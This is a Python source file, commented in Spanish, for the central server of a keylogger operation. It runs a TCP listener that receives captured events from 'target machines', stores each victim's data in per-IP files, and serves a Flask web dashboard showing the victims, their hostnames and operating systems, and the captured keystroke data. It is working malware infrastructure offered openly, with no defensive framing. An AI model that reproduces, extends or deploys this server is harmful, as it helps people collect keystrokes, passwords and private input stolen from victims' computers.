#!/usr/bin/env python3
"""
Servidor Central del Keylogger - Recibe conexiones de máquinas objetivo
Autor: Alvaro Manzo

ESTE SERVIDOR RECIBE DATOS DE MÚLTIPLES KEYLOGGERS
"""

import socket
import threading
import json
import time
from datetime import datetime
from flask import Flask, render_template, jsonify
from flask_cors import CORS
import requests
import os
from pathlib import Path

# Colores
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class CentralServer:
    def __init__(self, port=9999):
        self.port = port
        self.clients = {}  # IP -> datos del cliente
        self.running = False
        
        # Configurar Flask para el panel web
        self.app = Flask(__name__)
        CORS(self.app)
        
        self.setup_routes()
        self.setup_directories()
        
    def setup_directories(self):
        """Crear directorios necesarios"""
        self.data_dir = Path("captured_clients")
        self.data_dir.mkdir(exist_ok=True)
        
    def setup_routes(self):
        """Configurar rutas del servidor web"""
        
        @self.app.route('/')
        def panel():
            return render_template('control_panel.html')
        
        @self.app.route('/api/clients')
        def get_clients():
            """Obtener lista de clientes conectados"""
            return jsonify(self.clients)
        
        @self.app.route('/api/client/<client_ip>/data')
        def get_client_data(client_ip):
            """Obtener datos de un cliente específico"""
            client_file = self.data_dir / f"{client_ip.replace('.', '_')}.json"
            
            if client_file.exists():
                try:
                    with open(client_file, 'r', encoding='utf-8') as f:
                        data = [json.loads(line) for line in f if line.strip()]
                    return jsonify(data[-100:])  # Últimos 100 eventos
                except:
                    return jsonify([])
            return jsonify([])
    
    def get_public_ip(self):
        """Obtener IP pública del servidor"""
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            return response.json()['ip']
        except:
            return "Unknown"
    
    def print_server_banner(self):
        """Mostrar información del servidor"""
        os.system('clear' if os.name != 'nt' else 'cls')
        
        server_ip = self.get_public_ip()
        
        print(f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║               🌐 SERVIDOR CENTRAL KEYLOGGER 🌐                ║
║                  CONTROL DE MÚLTIPLES CLIENTES               ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}

{Colors.GREEN}🖥️  Información del Servidor:{Colors.END}
├── 🌍 IP Pública: {Colors.CYAN}{server_ip}{Colors.END}
├── 🔌 Puerto TCP: {Colors.BLUE}{self.port}{Colors.END}
├── 🌐 Panel Web: {Colors.BLUE}http://localhost:5000{Colors.END}
└── 📁 Datos en: {Colors.YELLOW}{self.data_dir.absolute()}{Colors.END}

{Colors.YELLOW}📡 Para conectar clientes, usa esta configuración:{Colors.END}
├── Servidor: {Colors.WHITE}{server_ip}{Colors.END}
├── Puerto: {Colors.WHITE}{self.port}{Colors.END}
└── URL completa: {Colors.WHITE}{server_ip}:{self.port}{Colors.END}

{Colors.PURPLE}🔗 Clientes Conectados: {len(self.clients)}{Colors.END}
        """)
        
        if self.clients:
            for ip, info in self.clients.items():
                status = f"{Colors.GREEN}🟢{Colors.END}" if info['connected'] else f"{Colors.RED}🔴{Colors.END}"
                print(f"├── {status} {Colors.CYAN}{ip}{Colors.END} - {Colors.WHITE}{info.get('hostname', 'Unknown')}{Colors.END}")
                print(f"│   └── Último contacto: {Colors.YELLOW}{info.get('last_seen', 'Never')}{Colors.END}")
        else:
            print(f"{Colors.GRAY}└── Ningún cliente conectado aún{Colors.END}")
            
        print(f"\n{Colors.BLUE}Presiona Ctrl+C para detener{Colors.END}")
    
    def handle_client(self, client_socket, address):
        """Manejar conexión de un cliente"""
        client_ip = address[0]
        
        print(f"\n{Colors.GREEN}🔌 Nueva conexión desde: {Colors.CYAN}{client_ip}{Colors.END}")
        
        try:
            while True:
                # Recibir datos del cliente
                data = client_socket.recv(4096).decode('utf-8')
                if not data:
                    break
                
                try:
                    # Procesar datos JSON
                    client_data = json.loads(data)
                    
                    # Obtener IP pública del cliente
                    public_ip = self.get_client_public_ip(client_ip)
                    
                    # Actualizar información del cliente
                    self.clients[public_ip] = {
                        'local_ip': client_ip,
                        'public_ip': public_ip,
                        'hostname': client_data.get('hostname', 'Unknown'),
                        'os_info': client_data.get('os_info', 'Unknown'),
                        'connected': True,
                        'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'total_events': self.clients.get(public_ip, {}).get('total_events', 0) + 1
                    }
                    
                    # Guardar datos del cliente
                    self.save_client_data(public_ip, client_data)
                    
                    # Respuesta al cliente
                    response = json.dumps({'status': 'received', 'server_time': datetime.now().isoformat()})
                    client_socket.send(response.encode('utf-8'))
                    
                except json.JSONDecodeError:
                    pass
                    
        except Exception as e:
            pass
        finally:
            # Marcar cliente como desconectado
            public_ip = self.get_client_public_ip(client_ip)
            if public_ip in self.clients:
                self.clients[public_ip]['connected'] = False
            
            client_socket.close()
            print(f"\n{Colors.RED}🔌 Cliente desconectado: {Colors.CYAN}{client_ip}{Colors.END}")
    
    def get_client_public_ip(self, client_local_ip):
        """Intentar obtener IP pública del cliente"""
        # En un entorno real, esto se haría desde el cliente
        # Por ahora usamos la IP local como identificador
        return client_local_ip
    
    def save_client_data(self, client_ip, data):
        """Guardar datos del cliente en archivo"""
        filename = f"{client_ip.replace('.', '_')}.json"
        filepath = self.data_dir / filename
        
        # Añadir timestamp y IP al evento
        data['server_received'] = datetime.now().isoformat()
        data['client_public_ip'] = client_ip
        
        # Guardar en archivo
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(json.dumps(data) + '\n')
    
    def start_tcp_server(self):
        """Iniciar servidor TCP para recibir clientes"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind(('0.0.0.0', self.port))
            server_socket.listen(10)
            
            print(f"{Colors.GREEN}🚀 Servidor TCP iniciado en puerto {self.port}{Colors.END}")
            
            while self.running:
                try:
                    client_socket, address = server_socket.accept()
                    client_thread = threading.Thread(
                        target=self.handle_client, 
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()
                except:
                    if self.running:
                        continue
                    else:
                        break
                        
        except Exception as e:
            print(f"{Colors.RED}❌ Error en servidor TCP: {e}{Colors.END}")
        finally:
            server_socket.close()
    
    def update_display(self):
        """Actualizar pantalla periódicamente"""
        while self.running:
            self.print_server_banner()
            time.sleep(3)
    
    def start(self):
        """Iniciar servidor completo"""
        self.running = True
        
        print(f"{Colors.CYAN}🌐 Iniciando Servidor Central Keylogger...{Colors.END}")
        
        # Crear plantilla HTML si no existe
        self.create_web_template()
        
        # Iniciar servidor TCP en thread separado
        tcp_thread = threading.Thread(target=self.start_tcp_server, daemon=True)
        tcp_thread.start()
        
        # Iniciar actualización de pantalla
        display_thread = threading.Thread(target=self.update_display, daemon=True)
        display_thread.start()
        
        # Iniciar servidor web Flask
        try:
            print(f"{Colors.BLUE}🌐 Panel web disponible en: http://localhost:5000{Colors.END}")
            self.app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🛑 Deteniendo servidor...{Colors.END}")
        finally:
            self.running = False
    
    def create_web_template(self):
        """Crear plantilla HTML para el panel de control"""
        template_dir = Path("templates")
        template_dir.mkdir(exist_ok=True)
        
        template_content = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🌐 Panel de Control Keylogger</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            color: white;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            padding: 30px;
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        
        .clients-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .client-card {
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 25px;
            border-left: 5px solid #00ff88;
            backdrop-filter: blur(10px);
        }
        
        .client-card.offline {
            border-left-color: #ff4444;
            opacity: 0.7;
        }
        
        .client-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .client-ip {
            font-size: 1.4rem;
            font-weight: bold;
        }
        
        .status-online {
            color: #00ff88;
            font-size: 1.2rem;
        }
        
        .status-offline {
            color: #ff4444;
            font-size: 1.2rem;
        }
        
        .client-info {
            margin: 10px 0;
        }
        
        .client-data {
            background: rgba(0,0,0,0.3);
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .event-item {
            background: rgba(255,255,255,0.1);
            margin: 5px 0;
            padding: 8px;
            border-radius: 5px;
            font-size: 0.9rem;
        }
        
        .refresh-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: #00ff88;
            color: #1e3c72;
            border: none;
            border-radius: 50px;
            padding: 15px 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(0,255,136,0.3);
        }
        
        .stats-bar {
            background: rgba(0,0,0,0.3);
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .stat-item {
            display: inline-block;
            margin: 0 30px;
        }
        
        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: #00ff88;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🌐 Panel de Control Keylogger</h1>
        <p>Monitoreo en tiempo real de clientes conectados</p>
    </div>
    
    <div class="stats-bar">
        <div class="stat-item">
            <div class="stat-number" id="totalClients">0</div>
            <div>Clientes Totales</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="onlineClients">0</div>
            <div>En Línea</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="totalEvents">0</div>
            <div>Eventos Capturados</div>
        </div>
    </div>
    
    <div class="clients-grid" id="clientsGrid">
        <div style="text-align: center; color: #ccc;">
            <h3>⏳ Esperando clientes...</h3>
            <p>Los keyloggers aparecerán aquí cuando se conecten</p>
        </div>
    </div>
    
    <button class="refresh-btn" onclick="loadClients()">🔄 Actualizar</button>
    
    <script>
        async function loadClients() {
            try {
                const response = await fetch('/api/clients');
                const clients = await response.json();
                
                displayClients(clients);
                updateStats(clients);
                
            } catch (error) {
                console.error('Error loading clients:', error);
            }
        }
        
        function displayClients(clients) {
            const grid = document.getElementById('clientsGrid');
            
            if (Object.keys(clients).length === 0) {
                grid.innerHTML = `
                    <div style="text-align: center; color: #ccc;">
                        <h3>⏳ Esperando clientes...</h3>
                        <p>Los keyloggers aparecerán aquí cuando se conecten</p>
                    </div>
                `;
                return;
            }
            
            grid.innerHTML = '';
            
            for (const [ip, info] of Object.entries(clients)) {
                const clientCard = document.createElement('div');
                clientCard.className = `client-card ${info.connected ? '' : 'offline'}`;
                
                clientCard.innerHTML = `
                    <div class="client-header">
                        <div class="client-ip">📍 ${ip}</div>
                        <div class="${info.connected ? 'status-online' : 'status-offline'}">
                            ${info.connected ? '🟢 En línea' : '🔴 Desconectado'}
                        </div>
                    </div>
                    
                    <div class="client-info">
                        <div><strong>🖥️ Hostname:</strong> ${info.hostname || 'Desconocido'}</div>
                        <div><strong>🌍 IP Local:</strong> ${info.local_ip || 'N/A'}</div>
                        <div><strong>💻 Sistema:</strong> ${info.os_info || 'Desconocido'}</div>
                        <div><strong>⏰ Último contacto:</strong> ${info.last_seen || 'Nunca'}</div>
                        <div><strong>📊 Eventos:</strong> ${info.total_events || 0}</div>
                    </div>
                    
                    <div class="client-data" id="data-${ip.replace(/\\./g, '_')}">
                        <div style="text-align: center; color: #ccc;">
                            <button onclick="loadClientData('${ip}')" style="background: #00ff88; color: #1e3c72; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer;">
                                📋 Ver Datos Capturados
                            </button>
                        </div>
                    </div>
                `;
                
                grid.appendChild(clientCard);
            }
        }
        
        async function loadClientData(clientIP) {
            try {
                const response = await fetch(`/api/client/${clientIP}/data`);
                const events = await response.json();
                
                const dataDiv = document.getElementById(`data-${clientIP.replace(/\\./g, '_')}`);
                
                if (events.length === 0) {
                    dataDiv.innerHTML = '<div style="text-align: center; color: #ccc;">No hay datos aún</div>';
                    return;
                }
                
                let html = '';
                events.slice(-10).forEach(event => {
                    const time = new Date(event.timestamp || event.server_received).toLocaleTimeString();
                    const type = event.type || 'unknown';
                    const data = JSON.stringify(event.data || '').substring(0, 50);
                    
                    html += `
                        <div class="event-item">
                            <strong>[${time}] ${type.toUpperCase()}:</strong> ${data}...
                        </div>
                    `;
                });
                
                dataDiv.innerHTML = html;
                
            } catch (error) {
                console.error('Error loading client data:', error);
            }
        }
        
        function updateStats(clients) {
            const total = Object.keys(clients).length;
            const online = Object.values(clients).filter(c => c.connected).length;
            const events = Object.values(clients).reduce((sum, c) => sum + (c.total_events || 0), 0);
            
            document.getElementById('totalClients').textContent = total;
            document.getElementById('onlineClients').textContent = online;
            document.getElementById('totalEvents').textContent = events;
        }
        
        // Auto-refresh cada 5 segundos
        setInterval(loadClients, 5000);
        
        // Cargar inicial
        loadClients();
    </script>
</body>
</html>
        """
        
        template_path = template_dir / "control_panel.html"
        with open(template_path, 'w', encoding='utf-8') as f:
            f.write(template_content)

def main():
    """Función principal"""
    server = CentralServer()
    
    try:
        server.start()
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}👋 Servidor detenido{Colors.END}")

if __name__ == "__main__":
    main()
